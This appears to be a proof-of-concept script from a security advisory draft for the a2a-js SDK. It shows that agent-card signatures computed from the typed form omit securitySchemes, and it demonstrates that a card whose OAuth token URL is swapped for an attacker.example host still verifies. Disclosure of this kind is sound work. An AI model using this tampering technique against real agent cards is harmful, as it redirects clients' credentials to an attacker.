// J1 (security advisory draft): canonicalizeAgentCard(card) computes
// AgentCard.toJSON(AgentCard.fromJSON(card)). fromJSON expects the JSON
// form; given the SDK's own in-memory form (what TypeScript's AgentCard type
// requires, and what DefaultAgentCardResolver.resolve() returns for any v1.0
// card that declares securitySchemes), each oneof member is
// {scheme: {$case, value}}, which fromJSON does not recognise: the entry
// becomes {} and cleanEmpty removes the whole securitySchemes object.
// The same happens to every oneof in the card (OAuthFlows.flow).
//
// Consequences shown below:
//   1. the canonical payload depends on the form of the input (a2a-js #663);
//   2. a card signed over the full §8.4.1 payload (any conformant signer)
//      does not verify through the SDK's client path (resolve -> verify);
//   3. a card signed with the SDK from its typed form is signed without
//      securitySchemes: whoever serves it can replace the OAuth token URL,
//      and a client that resolves and verifies with the SDK accepts it.
//
// Run: node j1-signature-skips-security-schemes.mjs
// Exit status: 0 = behaviour reproduced, 1 = not reproduced, 2 = setup error.
import { createServer } from 'node:http';
import { generateKeyPairSync } from 'node:crypto';
import {
  AgentCard,
  canonicalizeAgentCard,
  generateAgentCardSignature,
  verifyAgentCardSignature,
} from '@a2a-js/sdk';
import { DefaultAgentCardResolver } from '@a2a-js/sdk/client';

console.debug = () => {}; // the verifier logs every failed entry

// A v1.0 card in its JSON form, as served, with an OAuth 2.0
// client-credentials scheme and a requirement that uses it.
const cardJSON = {
  name: 'Payments Agent',
  description: 'd',
  version: '1.0.0',
  supportedInterfaces: [{ url: 'https://payments.example/a2a', protocolBinding: 'JSONRPC', protocolVersion: '1.0' }],
  capabilities: {},
  securitySchemes: {
    oauth: {
      oauth2SecurityScheme: {
        flows: { clientCredentials: { tokenUrl: 'https://payments.example/oauth/token', scopes: { pay: 'pay' } } },
      },
    },
  },
  securityRequirements: [{ schemes: { oauth: { list: ['pay'] } } }],
  defaultInputModes: ['text/plain'],
  defaultOutputModes: ['text/plain'],
  skills: [{ id: 'pay', name: 'pay', description: 'd', tags: ['t'] }],
};

const { privateKey, publicKey } = generateKeyPairSync('ed25519');
const header = { alg: 'EdDSA', typ: 'JOSE', kid: 'k' };
const sign = generateAgentCardSignature(privateKey, header);
const verify = verifyAgentCardSignature(async () => publicKey);
const outcome = async (card) => {
  try {
    await verify(card);
    return 'VERIFIED';
  } catch {
    return 'FAILED';
  }
};

// Serves a JSON body at /.well-known/agent-card.json; returns the base URL.
async function serve(body) {
  const srv = createServer((req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify(body));
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  return { url: `http://127.0.0.1:${srv.address().port}/`, close: () => srv.close() };
}
async function resolveAndVerify(body) {
  const s = await serve(body);
  try {
    const card = await new DefaultAgentCardResolver().resolve(s.url);
    return { result: await outcome(card), card };
  } finally {
    s.close();
  }
}

let reproduced = false;

// 1. Form dependence.
const typed = AgentCard.fromJSON(cardJSON); // the SDK's in-memory (typed) form
const fromJSONForm = canonicalizeAgentCard(cardJSON);
const fromTypedForm = canonicalizeAgentCard(typed);
console.log('1. canonical payload includes securitySchemes');
console.log(`   from the JSON form:   ${fromJSONForm.includes('securitySchemes')}`);
console.log(`   from the typed form:  ${fromTypedForm.includes('securitySchemes')}   (expected: true)`);
if (!fromTypedForm.includes('securitySchemes')) reproduced = true;

// 2. Signed over the full payload (as a2a-python or a2a-go would), served,
//    resolved and verified the way a client does.
const signedFull = await sign(cardJSON);
const r2 = await resolveAndVerify(signedFull);
console.log('2. card signed over the full payload, DefaultAgentCardResolver.resolve() + verifyAgentCardSignature');
console.log(`   ${r2.result}   (expected: VERIFIED)`);
if (r2.result !== 'VERIFIED') reproduced = true;

// 3. Signed from the typed form, served in JSON form, token URL replaced by
//    whoever serves the card.
const signedTyped = await sign(typed);
const served = AgentCard.toJSON(signedTyped);
const tampered = structuredClone(served);
tampered.securitySchemes.oauth.oauth2SecurityScheme.flows.clientCredentials.tokenUrl =
  'https://attacker.example/oauth/token';
const r3 = await resolveAndVerify(tampered);
const tokenUrl = r3.card.securitySchemes.oauth.scheme.value.flows.flow.value.tokenUrl;
console.log('3. card signed from the typed form, token URL replaced in transit, resolve() + verify');
console.log(`   ${r3.result}, client would send its client credentials to ${tokenUrl}   (expected: FAILED)`);
console.log(`   same served card, unmodified, verified in JSON form (what other SDKs do): ${await outcome(served)}   (expected: VERIFIED)`);
if (r3.result === 'VERIFIED') reproduced = true;

console.log(`reproduced: ${reproduced ? 'yes' : 'no'}`);
process.exit(reproduced ? 0 : 1);
